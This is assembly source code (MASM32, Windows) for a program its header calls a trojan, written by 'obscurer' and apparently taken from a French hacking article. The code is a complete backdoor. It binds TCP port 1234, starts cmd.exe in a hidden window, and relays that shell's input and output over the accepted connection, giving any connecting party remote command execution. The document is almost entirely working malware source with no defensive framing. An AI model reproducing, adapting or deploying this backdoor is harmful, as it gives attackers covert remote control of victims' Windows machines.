; *************************************************
; *	Article : Coder un TROJAN en ASM	  *   
; *       (spawn a shell on port 1234)		  *
; *                by obscurer			  *
; *************************************************

.386
.model flat, stdcall

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\Wsock32.lib

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\wsock32.inc


        WinMain PROTO :DWORD,:DWORD,:DWORD,:DWORD

.data
        hInstance       dd 0
	cmd		db "\winnt\system32\cmd.exe",0
       ;cmd		db "\windows\command.com",0

.code

start:
        invoke GetModuleHandle, NULL
        mov hInstance, eax

        invoke WinMain,hInstance,NULL,NULL,NULL
	invoke ExitProcess,NULL


WinMain proc hInst:DWORD,hPrevInst:DWORD,CmdLine:DWORD,CmdShow:DWORD


LOCAL sin   			:sockaddr_in
LOCAL wsaData			:WSADATA	
LOCAL sock 			:UINT		
LOCAL socka			:UINT
LOCAL output			:DWORD
LOCAL input			:DWORD

LOCAL info			:PROCESS_INFORMATION
LOCAL starti			:STARTUPINFO
LOCAL secu			:SECURITY_ATTRIBUTES
LOCAL read_1 			:HANDLE
LOCAL write_1			:HANDLE
LOCAL read_2			:HANDLE
LOCAL write_2			:HANDLE
LOCAL byte_read			:DWORD
LOCAL byte_toread		:DWORD


	invoke GlobalAlloc,GPTR,32000
	mov output,eax
	.if eax == NULL
	ret
	.endif

	invoke GlobalAlloc,GPTR,32000
	mov input,eax
	.if eax == NULL
	ret	
	.endif


	xor ebx,ebx	
	mov bx,2	
	shl bx,8
	or bx, 2
	invoke WSAStartup,ebx,ADDR wsaData


	.if eax != NULL
	ret
	.endif


	mov sin.sin_family,AF_INET
	mov sin.sin_addr,NULL
	mov sin.sin_port,0D204h		
				

debut:

	invoke socket,AF_INET,SOCK_STREAM,NULL
	mov sock,eax

	.if eax == INVALID_SOCKET
	ret
	.endif

	invoke bind,sock,ADDR sin,SIZEOF sockaddr_in
	.if eax == SOCKET_ERROR
	ret
	.endif

	invoke listen,sock,1
	.if eax == SOCKET_ERROR
	ret
	.endif

	invoke accept,sock,NULL,NULL
	.if eax == INVALID_SOCKET
	ret
	.endif

mov socka,eax

invoke RtlZeroMemory,ADDR secu,SIZEOF SECURITY_ATTRIBUTES
mov secu.niLength,SIZEOF SECURITY_ATTRIBUTES
mov secu.bInheritHandle,TRUE

	invoke CreatePipe,ADDR read_1,ADDR write_1,ADDR secu,32000
	.if eax == NULL
	jmp die
	.endif
	invoke CreatePipe,ADDR read_2,ADDR write_2,ADDR secu,32000
	.if eax == NULL
	jmp die
	.endif


invoke RtlZeroMemory,ADDR starti,SIZEOF STARTUPINFO

invoke GetStartupInfo,ADDR starti

mov starti.cb,SIZEOF STARTUPINFO

mov eax,write_1
mov starti.hStdError,eax
mov starti.hStdOutput,eax

mov eax,read_2
mov starti.hStdInput,eax

mov starti.dwFlags,STARTF_USESTDHANDLES+STARTF_USESHOWWINDOW
mov starti.wShowWindow,SW_HIDE

	invoke CreateProcess,
			ADDR cmd,
			NULL,
			ADDR secu,
			ADDR secu,
			TRUE,
			NULL,
			NULL,
			NULL,
			ADDR starti,
			ADDR info

	.if eax == NULL
	jmp die
	.endif

invoke CloseHandle,read_2
invoke CloseHandle,write_1

up:

	invoke PeekNamedPipe,read_1,NULL,NULL,NULL,ADDR byte_toread,NULL

	.if byte_toread == NULL
	jmp get_text
	.endif

	invoke RtlZeroMemory,ADDR output,SIZEOF output
	invoke ReadFile,read_1,ADDR output,SIZEOF output,ADDR byte_read,NULL
	invoke send,socka,ADDR output,byte_read,NULL
	jmp up

	
get_text:

	invoke RtlZeroMemory,ADDR input,SIZEOF input
	invoke recv,socka,ADDR input,SIZEOF input,NULL
	mov ebx,eax

	invoke WriteFile,write_2,ADDR input,ebx,ADDR byte_read,NULL

jmp up


die: 	
	invoke closesocket,sock
	invoke closesocket,socka
	ret
	

WinMain endp

end start
